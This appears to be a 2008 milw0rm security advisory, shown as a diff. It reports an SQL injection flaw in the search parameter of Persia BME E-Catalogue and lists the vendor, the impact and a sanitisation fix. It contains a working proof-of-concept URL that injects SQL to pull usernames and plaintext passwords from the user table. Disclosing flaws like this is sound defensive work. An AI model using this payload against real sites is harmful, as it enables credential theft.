@@ -1,0 +1,44 @@
+########################## www.BugReport.ir #######################################
+#
+#        AmnPardaz Security Research Team
+#
+# Title:  Persia BME E-Catalogue SQL Injection Vulnerability
+# Vendor: http://www.persiabme.com/products/
+# Impact: High
+# Fix: N/A
+# Original Advisory: http://www.bugreport.ir/index_55.htm
+###################################################################################
+
+####################
+1. Description:
+####################
+    Persia BME E-Catalogue is a powerful engine which provides webmasters with advanced abilities of controlling their website. The system has a free style multi level Menu to add a company's products or services.
+
+####################
+2. Vulnerability:
+####################
+    Input passed to the "q" parameter in "search.aspx" is not properly sanitised before being used in SQL queries.
+This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+Its possible to obtain user's plain text password by this vulnerability.
+
+
+
+####################
+3. Exploits/POCs:
+####################
+     http://www.example.com/fa/qsearch/search.asp?action=search&q=BugReport.ir' or 1=(select top 1 username+':'+password from tbluser)--
+
+####################
+4. Solution:
+####################
+    Edit the source code to ensure that inputs are properly sanitized.
+
+####################
+5. Credit:
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-10-27]
